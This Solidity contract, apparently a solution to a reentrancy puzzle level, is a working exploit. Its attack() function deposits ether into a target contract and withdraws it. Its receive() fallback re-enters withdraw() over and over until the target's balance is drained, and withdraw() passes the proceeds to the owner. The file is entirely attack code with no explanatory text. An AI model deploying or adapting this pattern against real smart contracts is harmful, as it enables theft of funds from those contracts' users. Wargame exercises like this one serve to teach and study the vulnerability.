// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IReentrance} from "@puzzles/10/IReentrance.sol";

contract ReentrancyAttacker is Ownable {
    IReentrance public puzzleContract;

    constructor(address _reentrance) Ownable(msg.sender) {
        puzzleContract = IReentrance(payable(_reentrance));
    }

    receive() external payable {
        if (address(puzzleContract).balance >= msg.value) {
            puzzleContract.withdraw(msg.value);
        }
    }

    function attack() public payable onlyOwner {
        puzzleContract.donate{value: msg.value}(address(this));
        puzzleContract.withdraw(msg.value);
    }

    function withdraw() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}
